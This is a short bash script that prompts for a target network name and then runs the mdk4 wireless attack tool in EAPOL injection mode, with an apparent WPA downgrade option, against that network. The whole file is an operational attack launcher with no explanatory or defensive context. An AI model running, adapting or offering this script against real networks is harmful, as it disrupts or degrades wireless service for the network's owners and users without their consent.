#!/bin/bash
ssid=$(zenity --entry --text="target ssid")
xterm -hold -e "mdk4 wlan0mon w -e $ssid -z"
